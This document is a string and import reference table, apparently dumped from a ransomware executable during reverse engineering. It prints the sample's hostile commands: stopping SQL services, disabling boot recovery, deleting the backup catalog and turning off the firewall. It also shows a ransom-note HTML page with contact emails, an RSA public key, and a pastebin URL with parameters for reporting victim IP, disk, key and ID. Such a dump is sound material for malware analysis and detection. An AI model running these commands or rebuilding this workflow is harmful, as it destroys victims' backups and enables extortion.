reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40675a	0x4cbf10	string	0x406690	" not used
0x407310	0x4cbf44	string	0x407240	InputBuffer
0x4073cc	0x4cbf44	string	0x407240	InputBuffer
0x407a70	0x4cbf80	string	0x407a20	InputFileNameWide
0x407a9c	0x4cbf94	string	0x407a20	InputBinaryMode
0x407af0	0x46b58d	string	0x407a20	;\rdqN
0x407c12	0x4cbfb4	string	0x407bb0	OutputFileNameWide
0x407c31	0x4cbfc8	string	0x407bb0	OutputBinaryMode
0x407c79	0x46b58d	string	0x407bb0	;\rdqN
0x4080ff	0x4cbffc	string	0x408010	DecodingLookupArray
0x4081a1	0x4cbff0	string	0x408010	Log2Base
0x408201	0x46b58d	string	0x408010	;\rdqN
0x4084b9	0x4cc084	string	0x408470	/GCM
0x408926	0x4cbfdc	string	0x408920	EncodingParameters
0x408e6a	0x4cc010	string	0x408cc0	InsertLineBreaks
0x408ea1	0x4cc024	string	0x408cc0	MaxLineLength
0x4090ea	0x4cc0b0	string	0x409080	C:\\Windows\
0x409642	0x4cc0e4	string	0x409080	
0x409bca	0x4cc11c	string	0x409080	Unhandled exception caught
0x409d94	0x46b58d	string	0x409080	;\rdqN
0x40abb7	0x4cc0e4	string	0x40aa20	
0x40b3ba	0x4cc11c	string	0x40aa20	Unhandled exception caught
0x40b58d	0x46b58d	string	0x40aa20	;\rdqN
0x40b677	0x4b7054	import	0x40b5e0	KERNEL32.dll.FindFirstFileW
0x40b688	0x4cc148	string	0x40b5e0	fuck
0x40ba4e	0x4cc16c	string	0x40b5e0	IDo.txt
0x40ba65	0x4cc17c	string	0x40b5e0	Decryption-Info
0x40bad0	0x4cc0b0	string	0x40b5e0	C:\\Windows\
0x40bc96	0x4b7030	import	0x40b5e0	KERNEL32.dll.lstrcmpW
0x40bcf7	0x4b702c	import	0x40b5e0	KERNEL32.dll.FindNextFileW
0x40bd06	0x4b7018	import	0x40b5e0	KERNEL32.dll.FindClose
0x40c012	0x46b58d	string	0x40b5e0	;\rdqN
0x40c105	0x4b7054	import	0x40c070	KERNEL32.dll.FindFirstFileW
0x40c118	0x4cc148	string	0x40c070	fuck
0x40c524	0x4cc0b0	string	0x40c070	C:\\Windows\
0x40c6ee	0x4cc1a8	string	0x40c070	threaad
0x40c71c	0x4cc1a8	string	0x40c070	threaad
0x40c75a	0x4b7030	import	0x40c070	KERNEL32.dll.lstrcmpW
0x40c7bb	0x4b702c	import	0x40c070	KERNEL32.dll.FindNextFileW
0x40c7ca	0x4b7018	import	0x40c070	KERNEL32.dll.FindClose
0x40cadd	0x46b58d	string	0x40c070	;\rdqN
0x40cbc7	0x4b7054	import	0x40cb30	KERNEL32.dll.FindFirstFileW
0x40cbd8	0x4cc148	string	0x40cb30	fuck
0x40cfda	0x4cc0b0	string	0x40cb30	C:\\Windows\
0x40d1a0	0x4b7030	import	0x40cb30	KERNEL32.dll.lstrcmpW
0x40d201	0x4b702c	import	0x40cb30	KERNEL32.dll.FindNextFileW
0x40d210	0x4b7018	import	0x40cb30	KERNEL32.dll.FindClose
0x40d518	0x46b58d	string	0x40cb30	;\rdqN
0x40d607	0x4b7054	import	0x40d570	KERNEL32.dll.FindFirstFileW
0x40d618	0x4cc148	string	0x40d570	fuck
0x40da1a	0x4cc0b0	string	0x40d570	C:\\Windows\
0x40dbe0	0x4b7030	import	0x40d570	KERNEL32.dll.lstrcmpW
0x40dc41	0x4b702c	import	0x40d570	KERNEL32.dll.FindNextFileW
0x40dc50	0x4b7018	import	0x40d570	KERNEL32.dll.FindClose
0x40df58	0x46b58d	string	0x40d570	;\rdqN
0x40e049	0x4b7054	import	0x40dfb0	KERNEL32.dll.FindFirstFileW
0x40e05a	0x4cc148	string	0x40dfb0	fuck
0x40e3b2	0x4cc0b0	string	0x40dfb0	C:\\Windows\
0x40e581	0x4b7030	import	0x40dfb0	KERNEL32.dll.lstrcmpW
0x40e5e2	0x4b702c	import	0x40dfb0	KERNEL32.dll.FindNextFileW
0x40e5f1	0x4b7018	import	0x40dfb0	KERNEL32.dll.FindClose
0x40e8f9	0x46b58d	string	0x40dfb0	;\rdqN
0x40e9e7	0x4b7054	import	0x40e950	KERNEL32.dll.FindFirstFileW
0x40e9f8	0x4cc148	string	0x40e950	fuck
0x40edfa	0x4cc0b0	string	0x40e950	C:\\Windows\
0x40efae	0x4b7030	import	0x40e950	KERNEL32.dll.lstrcmpW
0x40f00f	0x4b702c	import	0x40e950	KERNEL32.dll.FindNextFileW
0x40f01e	0x4b7018	import	0x40e950	KERNEL32.dll.FindClose
0x40f326	0x46b58d	string	0x40e950	;\rdqN
0x40f417	0x4b7054	import	0x40f380	KERNEL32.dll.FindFirstFileW
0x40f428	0x4cc148	string	0x40f380	fuck
0x40f81d	0x4cc0b0	string	0x40f380	C:\\Windows\
0x40f9d1	0x4b7030	import	0x40f380	KERNEL32.dll.lstrcmpW
0x40fa32	0x4b702c	import	0x40f380	KERNEL32.dll.FindNextFileW
0x40fa41	0x4b7018	import	0x40f380	KERNEL32.dll.FindClose
0x40fd49	0x46b58d	string	0x40f380	;\rdqN
0x40fded	0x4b705c	import	0x40fda0	KERNEL32.dll.GetLogicalDrives
0x40fed3	0x46b58d	string	0x40fda0	;\rdqN
0x40ff42	0x4cc1b0	string	0x40fee0	sqlserver.exe
0x40ff8a	0x4cc1c0	string	0x40fee0	msftesql.exe
0x40ffcf	0x4cc1d0	string	0x40fee0	sqlagent.exe
0x410014	0x4cc1e0	string	0x40fee0	sqlbrowser.exe
0x41004d	0x4cc1f0	string	0x40fee0	sqlwriter.exe
0x410083	0x4cc200	string	0x40fee0	mysqld.exe
0x4100b6	0x4cc20c	string	0x40fee0	mysqld-nt.exe
0x4100e9	0x4cc224	string	0x40fee0	mysqld-opt.exe
0x410124	0x4b7028	import	0x40fee0	KERNEL32.dll.CloseHandle
0x41013d	0x4b7020	import	0x40fee0	KERNEL32.dll.CreateToolhelp32Snapshot
0x410157	0x4b7050	import	0x40fee0	KERNEL32.dll.Process32First
0x4101b4	0x4b701c	import	0x40fee0	KERNEL32.dll.OpenProcess
0x4101c3	0x4b7010	import	0x40fee0	KERNEL32.dll.TerminateProcess
0x4101ca	0x4b7028	import	0x40fee0	KERNEL32.dll.CloseHandle
0x4101da	0x4b7024	import	0x40fee0	KERNEL32.dll.Process32Next
0x4101e5	0x4b7028	import	0x40fee0	KERNEL32.dll.CloseHandle
0x4101f3	0x4b7024	import	0x40fee0	KERNEL32.dll.Process32Next
0x410262	0x46b58d	string	0x40fee0	;\rdqN
0x410334	0x4b7054	import	0x4102a0	KERNEL32.dll.FindFirstFileW
0x410347	0x4cc148	string	0x4102a0	fuck
0x410515	0x4b7030	import	0x4102a0	KERNEL32.dll.lstrcmpW
0x41053b	0x4cc234	string	0x4102a0	\Decryption-Info.HTA
0x4105e3	0x4cc260	string	0x4102a0	error
0x41066a	0x4b702c	import	0x4102a0	KERNEL32.dll.FindNextFileW
0x410679	0x4b7018	import	0x4102a0	KERNEL32.dll.FindClose
0x410984	0x46b58d	string	0x4102a0	;\rdqN
0x410a57	0x4b7054	import	0x4109c0	KERNEL32.dll.FindFirstFileW
0x410a68	0x4cc148	string	0x4109c0	fuck
0x410e3b	0x4cc16c	string	0x4109c0	IDo.txt
0x410e4e	0x4cc17c	string	0x4109c0	Decryption-Info
0x410ea6	0x4cc0b0	string	0x4109c0	C:\\Windows\
0x41106c	0x4b7030	import	0x4109c0	KERNEL32.dll.lstrcmpW
0x4110cd	0x4b702c	import	0x4109c0	KERNEL32.dll.FindNextFileW
0x4110dc	0x4b7018	import	0x4109c0	KERNEL32.dll.FindClose
0x4113e4	0x46b58d	string	0x4109c0	;\rdqN
0x4114d9	0x4b7054	import	0x411440	KERNEL32.dll.FindFirstFileW
0x4114ea	0x4cc148	string	0x411440	fuck
0x411839	0x4cc0b0	string	0x411440	C:\\Windows\
0x411a03	0x4b7030	import	0x411440	KERNEL32.dll.lstrcmpW
0x411a64	0x4b702c	import	0x411440	KERNEL32.dll.FindNextFileW
0x411a73	0x4b7018	import	0x411440	KERNEL32.dll.FindClose
0x411d82	0x46b58d	string	0x411440	;\rdqN
0x411e2b	0x4cc290	string	0x411dd0	0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM
0x411efa	0x46b58d	string	0x411dd0	;\rdqN
0x411f8c	0x4cc2ec	string	0x411f10	active
0x411f9d	0x4cc2f4	string	0x411f10	detive
0x4120ef	0x4cc300	string	0x411f10	pastebin.com
0x412183	0x4cc310	string	0x411f10	/raw/eEpt6UrD
0x412390	0x4cc320	string	0x411f10	/1614CEEEC50A9336EBF690886CAA747D6811C45D37086A3FA7B11C9E83926C6C
0x412438	0x4cc368	string	0x411f10	From
0x41253a	0x4cc390	string	0x411f10	&ip=
0x412552	0x4cc388	string	0x411f10	&disk=
0x412583	0x4cc380	string	0x411f10	&key=
0x4125b4	0x4cc378	string	0x411f10	&id=
0x4125e5	0x4cc370	string	0x411f10	&mail=
0x41302d	0x46b58d	string	0x411f10	;\rdqN
0x41368c	0x4cc39c	string	0x4135b0	C:\ProgramData\IDo.txt
0x4136fa	0x4cc46c	string	0x4135b0	C:\ProgramData\pubkey.txt
0x4138c8	0x4cc46c	string	0x4135b0	C:\ProgramData\pubkey.txt
0x4138fe	0x4cbf70	string	0x4135b0	InputFileName
0x41391d	0x4cbf94	string	0x4135b0	InputBinaryMode
0x413aef	0x4cc488	string	0x4135b0	C:\ProgramData
0x413c61	0x4cc268	string	0x4135b0	0123456789QWERTYUIOPASDFGHJKLZXCVBNM
0x413dfa	0x4cc39c	string	0x4135b0	C:\ProgramData\IDo.txt
0x4142c4	0x4cc46c	string	0x4135b0	C:\ProgramData\pubkey.txt
0x4142f7	0x4cbfa4	string	0x4135b0	OutputFileName
0x414316	0x4cbfc8	string	0x4135b0	OutputBinaryMode
0x4143e9	0x4cc2ec	string	0x4135b0	active
0x414499	0x4cc46c	string	0x4135b0	C:\ProgramData\pubkey.txt
0x4144ab	0x4cc498	string	0x4135b0	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAzA+0svdK/zcghzPRS7F+pPzCjAlygcNhQj/T5g7HigLegVH/Fi2dhjBDxjt9Ly3aPsHpTb32ub2xb3gvv2VcBi4PVOClceG9Pq6M6HlUGYt1yhSRx8v+0CHX9Dg9rA/3SMhlqsVodtHtMbefPnPhto1/QY4FCcS3xGcC97Ja+oDkCVnkES8U1xeHno5kIlIWMulS5pjM6D3hss5yjUjIHiSr06QS4gCLX1ZijMo0wA3y6k9RUm9Me8MYiss/39RzsgGwDv5+DNxkLgSU25Sa2NZ8iG+Vufk/CkWe9CQj/SRCHm/mVQpNlfbthTTGh3OXy36pu46nYv3fS/ulkqHTaQIBEQ==
0x4144cb	0x4cc46c	string	0x4135b0	C:\ProgramData\pubkey.txt
0x4145f3	0x4cc498	string	0x4135b0	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAzA+0svdK/zcghzPRS7F+pPzCjAlygcNhQj/T5g7HigLegVH/Fi2dhjBDxjt9Ly3aPsHpTb32ub2xb3gvv2VcBi4PVOClceG9Pq6M6HlUGYt1yhSRx8v+0CHX9Dg9rA/3SMhlqsVodtHtMbefPnPhto1/QY4FCcS3xGcC97Ja+oDkCVnkES8U1xeHno5kIlIWMulS5pjM6D3hss5yjUjIHiSr06QS4gCLX1ZijMo0wA3y6k9RUm9Me8MYiss/39RzsgGwDv5+DNxkLgSU25Sa2NZ8iG+Vufk/CkWe9CQj/SRCHm/mVQpNlfbthTTGh3OXy36pu46nYv3fS/ulkqHTaQIBEQ==
0x41496e	0x46b58d	string	0x4135b0	;\rdqN
0x414f38	0x4b7058	import	0x414ef0	KERNEL32.dll.FreeConsole
0x414f8d	0x4cc640	string	0x414ef0	helpdiamond@aol.com
0x414fd7	0x4cc654	string	0x414ef0	hardloggg@aol.com
0x41501c	0x4cc678	string	0x414ef0	.Void
0x4150ac	0x4cc680	string	0x414ef0	net stop SQLWriter
0x4150b6	0x4cc694	string	0x414ef0	net stop SQLBrowser
0x4150c0	0x4cc6a8	string	0x414ef0	net stop MSSQLSERVER
0x4150ca	0x4cc6c0	string	0x414ef0	net stop MSSQL$CONTOSO1
0x4150d4	0x4cc6d8	string	0x414ef0	net stop MSDTC
0x4150de	0x4cc6e8	string	0x414ef0	bcdedit /set {default} bootstatuspolicy ignoreallfailures
0x4150e8	0x4cc724	string	0x414ef0	bcdedit /set {default} recoveryenabled no
0x4150f2	0x4cc750	string	0x414ef0	wbadmin delete catalog -quiet
0x4150fc	0x4cc770	string	0x414ef0	net stop SQLSERVERAGENT
0x415106	0x4cc6a8	string	0x414ef0	net stop MSSQLSERVER
0x415110	0x4cc788	string	0x414ef0	net stop vds
0x41511a	0x4cc798	string	0x414ef0	netsh advfirewall set currentprofile state off
0x415124	0x4cc7c8	string	0x414ef0	netsh firewall set opmode mode=disable
0x4151a5	0x4b7014	import	0x414ef0	KERNEL32.dll.GetDriveTypeA
0x415382	0x46bef0	string	0x414ef0	WVS3
0x415390	0x46bef0	string	0x414ef0	WVS3
0x4155cd	0x4cc888	string	0x414ef0	<html><head><meta http-equiv='X-UA-Compatible' content='IE=11' /><script type='text/javascript'>window.resizeTo(window.screen.width,window.screen.height);</script><style>body { background-color: #f7f5ff; text-align: center; } #h1{text-shadow: -2px -2px #a2faf6; color: black; transition: font-size 1s; } #h1:hover{ font-size: 50px; } #d1{ background-color: #a9e4e9; width: 93%; height: 190px; margin: auto; text-align: center; border-radius: 13px; font-size: 14pt; padding-top: 10px; transition: width 1s, height 1s ,font-size 1s; font-weight: bold; } #d2{ background-color: #a9e4e9; width: 93%; height: 150px; margin: auto; margin-top: 16px; text-align: center; border-radius: 13px; font-size: 14pt; padding-top: 10px; transition: width 1s, height 1s ,font-size 1s; font-weight: bold; } #d1:hover{ box-shadow:-4px -4px 10px black; height: 190px; width: 95%; font-size: 15pt; } #d2:hover{ box-shadow:-4px -4px 10px black; height: 170px; width: 95%; font-size: 15pt; } #d3{ background-color: #a9e4e9; width: 93%; height: 90px; margin: auto; margin-top: 10px; text-align: center; border-radius: 13px; font-size: 14pt; padding-top: 10px; transition: width 1s, height 1s ,font-size 1s; font-weight: bold; } #d3:hover{ box-shadow:-4px -4px 10px black; height: 100px; width: 95%; font-size: 15pt; } </style> <title>ENCRYPTED</title></head><body><img src='https://i.ibb.co/2PXVhhm/1.png' height='90px' width
0x415604	0x4cc85c	string	0x414ef0	<br> Our Email :
0x4156cc	0x4cc820	string	0x414ef0	<br> In Case Of No Answer :
0x415797	0x4cc7f0	string	0x414ef0	</div> </body> </html>
0x415a59	0x4b7014	import	0x414ef0	KERNEL32.dll.GetDriveTypeA
0x415d47	0x4cdfb8	string	0x414ef0	threads
0x415e0d	0x4b7014	import	0x414ef0	KERNEL32.dll.GetDriveTypeA
0x415f0a	0x4cc11c	string	0x414ef0	Unhandled exception caught
0x415f8f	0x4cdfb8	string	0x414ef0	threads
0x416055	0x4b7014	import	0x414ef0	KERNEL32.dll.GetDriveTypeA
0x416156	0x4cc11c	string	0x414ef0	Unhandled exception caught
0x4161d7	0x4cdfb8	string	0x414ef0	threads
0x41626f	0x4cc46c	string	0x414ef0	C:\ProgramData\pubkey.txt
0x416279	0x4cdfc0	string	0x414ef0	C:\ProgramData\ID0.txt
0x416316	0x4cc11c	string	0x414ef0	Unhandled exception caught
0x416785	0x46b58d	string	0x414ef0	;\rdqN
0x41706f	0x417079	string	0x416ff0	3ɉHP blocks=Basic Latin,Latin Extended-B
0x41709e	0x4170a8	string	0x416ff0	3ɉHP blocks=Basic Latin,Latin Extended-B
0x417b16	0x417b26	string	0x417aa0	3ɉJP blocks=Basic Latin,Latin Extended-B
0x417b1c	0x417b26	string	0x417aa0	3ɉJP blocks=Basic Latin,Latin Extended-B
0x417b6f	0x417b7f	string	0x417aa0	3ɉJP blocks=Basic Latin,Latin Extended-B
0x417b75	0x417b7f	string	0x417aa0	3ɉJP blocks=Basic Latin,Latin Extended-B
0x417c02	0x4cbf50	string	0x417bd0	SHA-1
0x417f77	0x4cdfd8	string	0x417f40	OutputStringPointer
0x418f97	0x418fa9	string	0x418ee0	3ۋE\b blocks=Basic Latin,Arabic
0x4198b3	0x4198b7	string	0x419890	WPRQ
0x4199c6	0x46b58d	string	0x4198f0	;\rdqN
0x419acf	0x46b58d	string	0x4199e0	;\rdqN
0x419f5d	0x46b58d	string	0x419cb0	;\rdqN
0x41a0aa	0x46b58d	string	0x41a080	;\rdqN
0x41a0e8	0x46b58d	string	0x41a080	;\rdqN
0x41a14b	0x46b58d	string	0x41a080	;\rdqN
0x41a1de	0x46b58d	string	0x41a080	;\rdqN
0x41ad96	0x4cc39c	string	0x41aca0	C:\ProgramData\IDo.txt
0x41af84	0x46b58d	string	0x41aeb0	;\rdqN
0x41b09c	0x46b58d	string	0x41af90	;\rdqN
0x41b6ba	0x46b58d	string	0x41b430	;\rdqN
0x41b7e5	0x46b58d	string	0x41b7c0	;\rdqN
0x41b821	0x46b58d	string	0x41b7c0	;\rdqN
0x41b87c	0x46b58d	string	0x41b7c0	;\rdqN
0x41b8db	0x46b58d	string	0x41b7c0	;\rdqN
0x41b91e	0x46b58d	string	0x41b7c0	;\rdqN
0x41becc	0x41bed6	string	0x41be70	3ɉHP blocks=Basic Latin,Latin Extended-B
0x41befe	0x41bf08	string	0x41be70	3ɉHP blocks=Basic Latin,Latin Extended-B
0x41ce43	0x41ce53	string	0x41cdf0	3ɉJP blocks=Basic Latin,Latin Extended-B
0x41ce49	0x41ce53	string	0x41cdf0	3ɉJP blocks=Basic Latin,Latin Extended-B
0x41d0b6	0x46b58d	string	0x41d020	;\rdqN
0x41d30c	0x46b58d	string	0x41d2b0	;\rdqN
0x41d4cd	0x46b58d	string	0x41d320	;\rdqN
0x41d68d	0x46b58d	string	0x41d4e0	;\rdqN
0x41d710	0x46b58d	string	0x41d6a0	;\rdqN
0x41d790	0x46b58d	string	0x41d720	;\rdqN
0x41d80d	0x46b58d	string	0x41d7a0	;\rdqN
0x41d88d	0x46b58d	string	0x41d820	;\rdqN
0x41dba4	0x46b58d	string	0x41d8a0	;\rdqN
0x41df01	0x4ce07c	string	0x41dec0	BufferedTransformation: this object doesn't allow input
0x41e0a1	0x4ce07c	string	0x41e060	BufferedTransformation: this object doesn't allow input
0x41ea4e	0x46b58d	string	0x41e9e0	;\rdqN
0x41ea86	0x46b58d	string	0x41e9e0	;\rdqN
0x41ea98	0x46b58d	string	0x41e9e0	;\rdqN
0x41eff2	0x46b58d	string	0x41ef90	;\rdqN
0x41f02a	0x46b58d	string	0x41ef90	;\rdqN
0x41f03c	0x46b58d	string	0x41ef90	;\rdqN
0x41f136	0x46b58d	string	0x41f050	;\rdqN
0x41f960	0x4ce0b4	string	0x41f960	vector<T> too long
0x41ff83	0x46b58d	string	0x41fb30	;\rdqN
0x4204d7	0x46b58d	string	0x420030	;\rdqN
0x42061c	0x4cc08c	string	0x4205b0	MGF1
0x420642	0x4cbf50	string	0x4205b0	SHA-1
0x420870	0x4ce120	string	0x420870	invalid string position
0x420b9d	0x46b58d	string	0x420ae0	;\rdqN
0x420e98	0x420e88	string	0x420e70	;P\bu\r
0x421213	0x46b58d	string	0x421030	;\rdqN
0x42140a	0x46b58d	string	0x421220	;\rdqN
0x421bba	0x46b58d	string	0x421a40	;\rdqN
0x421cc4	0x46b58d	string	0x421bd0	;\rdqN
0x421e21	0x46b58d	string	0x421cf0	;\rdqN
0x421f61	0x46b58d	string	0x421e30	;\rdqN
0x421fab	0x4cbf58	string	0x421f70	FeedbackSize
0x421fd0	0x46b58d	string	0x421f70	;\rdqN
0x422112	0x46b58d	string	0x421fe0	;\rdqN
0x422639	0x4cc19c	string	0x422530	shit
0x4227fd	0x46b58d	string	0x422750	;\rdqN
0x4228d2	0x4cc46c	string	0x422890	C:\ProgramData\pubkey.txt
0x422962	0x4cc488	string	0x422920	C:\ProgramData
0x422c8e	0x46b58d	string	0x422a80	;\rdqN
0x422edc	0x46b58d	string	0x422ce0	;\rdqN
0x423a8c	0x46b58d	string	0x4238e0	;\rdqN
0x423c59	0x46b58d	string	0x423aa0	;\rdqN
0x423e48	0x46b58d	string	0x423c70	;\rdqN
0x424874	0x46b58d	string	0x424660	;\rdqN
0x424c90	0x4ce138	string	0x424c90	string too long
0x425665	0x4cbbf8	string	0x425570	false
0x42567b	0x4cbc00	string	0x425570	true
0x425718	0x46b58d	string	0x425570	;\rdqN
0x42599a	0x46b58d	string	0x425750	;\rdqN
0x425be6	0x46b58d	string	0x425ab0	;\rdqN
0x425cee	0x46b58d	string	0x425c00	;\rdqN
0x425def	0x46b58d	string	0x425d00	;\rdqN
0x426258	0x46b58d	string	0x4261c0	;\rdqN
0x426305	0x46b58d	string	0x426270	;\rdqN
0x4263d8	0x46b58d	string	0x426310	;\rdqN
0x4266d5	0x46b58d	string	0x426600	;\rdqN
0x4267b2	0x46b58d	string	0x4266e0	;\rdqN
0x426d86	0x46b58d	string	0x426bb0	;\rdqN
0x426f6c	0x46b58d	string	0x426d90	;\rdqN
0x427b44	0x4b7278	import	0x427b20	WS2_32.dll.socket
0x427b55	0x4b7468	string	0x427b20	Failed to create socket
0x427bab	0x4b727c	import	0x427b20	WS2_32.dll.setsockopt
0x427bb6	0x4b7480	string	0x427b20	all your TCP packets will be buffered
0x427bbb	0x4b74a8	string	0x427b20	Failed to set socket option "TCP_NODELAY" ;
0x427bd8	0x4b727c	import	0x427b20	WS2_32.dll.setsockopt
0x427be3	0x4b74d8	string	0x427b20	Failed to enable broadcast on UDP socket
0x427d79	0x4b7270	import	0x427d70	WS2_32.dll.htonl
0x427e07	0x4b7504	string	0x427dd0	www.sfml-dev.org
0x427ecf	0x4b7518	string	0x427dd0	/ip-provider.php
0x4281ef	0x46b58d	string	0x427dd0	;\rdqN
0x4283bd	0x4b752c	string	0x4283b0	255.255.255.255
0x4283d7	0x4283eb	string	0x4283b0	h<uK
0x4283eb	0x4b753c	string	0x4283b0	0.0.0.0
0x428408	0x4b726c	import	0x4283b0	WS2_32.dll.inet_addr
0x42844d	0x4b7260	import	0x4283b0	WS2_32.dll.getaddrinfo
0x428465	0x4b725c	import	0x4283b0	WS2_32.dll.freeaddrinfo
0x428482	0x4b7264	import	0x428480	WS2_32.dll.ntohl
0x428497	0x4b7268	import	0x428490	WS2_32.dll.inet_ntoa
0x428dbf	0x46b58d	string	0x428a50	;\rdqN
0x4294de	0x4294f0	string	0x429470	_^[]
0x429f2b	0x429f60	string	0x429e60	;K\fs
0x42ac54	0x46b58d	string	0x42a700	;\rdqN
0x42ad7b	0x4cbbf8	string	0x42ac80	false
0x42ada9	0x4cbc00	string	0x42ac80	true
0x42af36	0x4b77bc	string	0x42ae10	0123456789-+Ee
0x42ba95	0x46b58d	string	0x42ae10	;\rdqN
0x42bbad	0x4b77e8	string	0x42bab0	0123456789ABCDEFabcdef-+XxPp
0x42c76f	0x46b58d	string	0x42bab0	;\rdqN
0x42c806	0x4b77cc	string	0x42c780	0123456789ABCDEFabcdef-+Xx
0x42cc76	0x46b58d	string	0x42c780	;\rdqN
0x42d205	0x46b58d	string	0x42cd20	;\rdqN
0x42d487	0x46b58d	string	0x42d350	;\rdqN
0x42d5bb	0x46b58d	string	0x42d4a0	;\rdqN
0x42d6de	0x46b58d	string	0x42d5d0	;\rdqN
0x42d7fe	0x46b58d	string	0x42d6f0	;\rdqN
0x42d978	0x46b58d	string	0x42d810	;\rdqN
0x42daef	0x46b58d	string	0x42d990	;\rdqN
0x42dcc3	0x46b58d	string	0x42db00	;\rdqN
0x42ddd6	0x46b58d	string	0x42dcd0	;\rdqN
0x42df08	0x46b58d	string	0x42ddf0	;\rdqN
0x42e038	0x46b58d	string	0x42df20	;\rdqN
0x42e306	0x46b58d	string	0x42e050	;\rdqN
0x42e3d2	0x46b58d	string	0x42e370	;\rdqN
0x42e442	0x46b58d	string	0x42e3e0	;\rdqN
0x42e5fa	0x46b58d	string	0x42e450	;\rdqN
0x42e7ba	0x46b58d	string	0x42e610	;\rdqN
0x42e822	0x46b58d	string	0x42e7d0	;\rdqN
0x42e895	0x46b58d	string	0x42e830	;\rdqN
0x42e905	0x46b58d	string	0x42e8a0	;\rdqN
